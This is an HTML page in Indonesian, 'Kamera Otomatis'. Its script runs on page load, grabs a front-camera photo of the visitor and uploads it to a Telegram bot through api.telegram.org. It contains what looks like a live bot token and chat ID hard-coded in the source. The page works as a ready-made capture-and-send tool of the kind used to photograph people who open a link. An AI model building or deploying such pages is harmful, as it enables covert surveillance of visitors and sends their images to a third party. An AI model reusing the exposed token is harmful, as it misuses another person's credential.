<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kamera Otomatis</title>
    <style>
        body {
            background-color: #000;
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
        }
        
        .container {
            text-align: center;
            padding: 20px;
        }
        
        .status {
            margin: 20px 0;
            font-size: 18px;
        }
        
        .loading {
            display: none;
            margin-top: 20px;
        }
        
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 4px solid #fff;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .error {
            color: #ff5555;
            display: none;
        }
        
        .success {
            color: #55ff55;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Kamera Otomatis</h1>
        <div class="status" id="status">Mengakses kamera...</div>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Mengambil foto dan mengirim ke Telegram...</p>
        </div>
        <div class="error" id="error"></div>
        <div class="success" id="success">Foto berhasil dikirim ke Telegram!</div>
    </div>

    <script>
        // Konfigurasi Telegram Bot
        const TELEGRAM_BOT_TOKEN = '8255783371:AAGYMSQvRJx8dLtS7ADxyb4Kl8Q4S2g5Jao'; // Ganti dengan token bot Anda
        const TELEGRAM_CHAT_ID = '5408845642'; // Ganti dengan chat ID Anda
        
        // Elemen DOM
        const statusElement = document.getElementById('status');
        const loadingElement = document.getElementById('loading');
        const errorElement = document.getElementById('error');
        const successElement = document.getElementById('success');
        
        // Fungsi untuk mengirim foto ke Telegram
        async function sendPhotoToTelegram(photoBlob) {
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('photo', photoBlob, 'captured_photo.jpg');
            formData.append('caption', 'Foto otomatis diambil dari website kamera');
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                
                if (result.ok) {
                    return true;
                } else {
                    throw new Error(result.description || 'Gagal mengirim foto ke Telegram');
                }
            } catch (error) {
                console.error('Error sending photo to Telegram:', error);
                throw error;
            }
        }
        
        // Fungsi untuk mengambil foto dari kamera
        async function capturePhoto() {
            try {
                // Meminta akses ke kamera
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user', // Menggunakan kamera depan
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    } 
                });
                
                // Membuat elemen video untuk menangkap frame
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                // Menunggu video siap
                await new Promise(resolve => {
                    video.addEventListener('loadeddata', resolve);
                });
                
                // Membuat canvas untuk mengambil foto
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');
                
                // Menggambar frame video ke canvas
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Menghentikan stream kamera
                stream.getTracks().forEach(track => track.stop());
                
                // Mengonversi canvas ke blob
                return new Promise(resolve => {
                    canvas.toBlob(resolve, 'image/jpeg', 0.8);
                });
                
            } catch (error) {
                console.error('Error capturing photo:', error);
                throw error;
            }
        }
        
        // Fungsi utama
        async function main() {
            try {
                // Periksa apakah browser mendukung getUserMedia
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    throw new Error('Browser tidak mendukung akses kamera');
                }
                
                // Periksa apakah token dan chat ID sudah diatur
                if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
                    throw new Error('Harap atur token bot Telegram dan chat ID terlebih dahulu');
                }
                
                statusElement.textContent = 'Mengambil foto...';
                
                // Ambil foto
                const photoBlob = await capturePhoto();
                
                statusElement.style.display = 'none';
                loadingElement.style.display = 'block';
                
                // Kirim foto ke Telegram
                await sendPhotoToTelegram(photoBlob);
                
                loadingElement.style.display = 'none';
                successElement.style.display = 'block';
                
                // Tampilkan pesan sukses selama 5 detik sebelum menutup halaman
                setTimeout(() => {
                    document.body.innerHTML = '<div class="container"><h1>Foto berhasil dikirim!</h1></div>';
                }, 5000);
                
            } catch (error) {
                console.error('Error:', error);
                statusElement.style.display = 'none';
                errorElement.textContent = `Error: ${error.message}`;
                errorElement.style.display = 'block';
            }
        }
        
        // Jalankan fungsi utama ketika halaman dimuat
        window.addEventListener('load', main);
    </script>
</body>
</html>
